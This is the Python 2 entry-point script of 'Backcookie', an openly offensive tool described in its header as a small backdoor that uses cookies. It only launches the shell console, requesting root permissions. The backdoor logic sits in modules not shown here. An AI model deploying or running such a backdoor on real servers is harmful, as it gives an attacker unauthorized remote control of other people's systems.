#!/usr/bin/env python
# -*- coding: utf-8 -*-
#**
#
##############
# Backcookie #
##############
#
# Small backdoor using cookie.
#
# @version     1.0.2
# @link        https://github.com/jofpin/backcookie
# @author      Jose Pino (Fraph), @jofpin | jofpin@gmail.com
#
# This file is the boot in Backcookie.
# For full copyright information this visit: https://github.com/jofpin/backcookie
#
# Copyright 2016 by Jose Pino <jofpin@gmail.com>
#
###############################################
#                                             #   
try:                                          # 
    import requests                           #
except:                                       ################################
    print "\t\nPlease install requests library, you can do it executing: \n" #
    print "\t\npip install requests"          ################################
from core.backcookie import Backcookie        #
from core.elements import elements            #
#                                             #
################################################################################
# Backcookie is like the people who finds the love of his life every 2 months. #
################################################################################
#

# Make a call to run the shell console

appShell = Backcookie()

# Request root home to run <backcookie> with all permissions
appShell.rootConnection()

if __name__ == "__main__":
        try:
        	# General expression this is expressed after the root
        	appShell.main()
        except Exception as error:
        	elements.close(elements.color['red'] + "Error: " + elements.color['blue'] + "%s" % error + elements.color['white']) # Result of error
